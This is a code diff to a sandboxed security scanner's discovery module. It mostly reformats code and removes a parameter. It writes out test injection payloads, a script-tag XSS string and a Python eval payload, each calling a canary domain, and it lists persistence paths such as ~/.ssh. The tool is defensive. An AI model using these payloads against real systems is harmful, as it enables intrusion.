@@ -41,7 +41,7 @@ import asyncio
 import logging
 import time
 import uuid
-from dataclasses import dataclass
+from dataclasses import dataclass, field
 from typing import Any
 
 from dast.sandbox.client import SandboxClient, SandboxPlan, SandboxTrace
@@ -77,7 +77,7 @@ class DiscoveryPayload:
     # observed paths against this substring list. Used for persistence
     # detection: writes to /etc, ~/.ssh, ~/.bashrc, etc.
     oracle_observed_paths: tuple[str, ...] = ()
-    image_hint: str = "networked"  # most discovery payloads need network egress
+    image_hint: str = "lean"  # v1.8 P2b: lean now has network tools baked in
 
 
 # v0.0 library — top CWEs by attack-surface frequency.
@@ -204,7 +204,11 @@ DISCOVERY_PAYLOADS: tuple[DiscoveryPayload, ...] = (
         # would call the canary domain. For non-web files this won't
         # fire — that's correct behavior.
         payload_input=(f'<script src="http://{_DISCOVERY_DOMAIN}/cwe79.js"></script>'),
-        commands=(f"{_TARGET_INVOKE} '<script src=\"http://{_DISCOVERY_DOMAIN}/cwe79.js\"></script>' 2>&1 || true",),
+        commands=(
+            f"{_TARGET_INVOKE} "
+            f"'<script src=\"http://{_DISCOVERY_DOMAIN}/cwe79.js\"></script>' "
+            "2>&1 || true",
+        ),
         oracle_keywords=(_DISCOVERY_DOMAIN,),
     ),
     DiscoveryPayload(
@@ -262,7 +266,10 @@ DISCOVERY_PAYLOADS: tuple[DiscoveryPayload, ...] = (
         # Python-style code injection via input that contains eval-able
         # expressions. If the file does ``eval(input)`` or ``exec(input)``
         # or imports based on input, this triggers a network call.
-        payload_input=(f"__import__('urllib.request').request.urlopen('http://{_DISCOVERY_DOMAIN}/cwe94-eval').read()"),
+        payload_input=(
+            f"__import__('urllib.request').request.urlopen("
+            f"'http://{_DISCOVERY_DOMAIN}/cwe94-eval').read()"
+        ),
         commands=(
             f"{_TARGET_INVOKE} "
             f"\"__import__('urllib.request').request.urlopen("
@@ -490,12 +497,7 @@ def _oracle_match(
 # ── Discovery runner ─────────────────────────────────────────────────────────
 
 
-def _build_plan(
-    file_id: str,
-    payload: DiscoveryPayload,
-    plan_index: int,
-    file_name: str = "",
-) -> SandboxPlan:
+def _build_plan(file_id: str, payload: DiscoveryPayload, plan_index: int) -> SandboxPlan:
     """Construct a SandboxPlan for one discovery payload."""
     return SandboxPlan(
         plan_id=f"discovery-{file_id}-{plan_index:03d}-{uuid.uuid4().hex[:8]}",
@@ -506,7 +508,6 @@ def _build_plan(
         payload=payload.payload_input,
         timeout_sec=30,
         image_hint=payload.image_hint,
-        file_name=file_name,
     )
 
 
@@ -516,7 +517,6 @@ async def run_discovery(
     sandbox: SandboxClient,
     payloads: tuple[DiscoveryPayload, ...] = DISCOVERY_PAYLOADS,
     timeout_sec: float = 60.0,
-    file_name: str = "",
 ) -> tuple[list[DiscoveredFinding], list[dict[str, Any]]]:
     """Run the discovery payload library against one file in the sandbox.
 
@@ -536,11 +536,11 @@ async def run_discovery(
     traces_summary: list[dict[str, Any]] = []
 
     for idx, p in enumerate(payloads):
-        plan = _build_plan(file_id, p, idx, file_name=file_name)
+        plan = _build_plan(file_id, p, idx)
         t0 = time.time()
         try:
             trace = await asyncio.wait_for(sandbox.submit(plan), timeout=timeout_sec)
-        except TimeoutError:
+        except asyncio.TimeoutError:
             log.warning("discovery plan %s timed out", plan.plan_id)
             traces_summary.append(
                 {
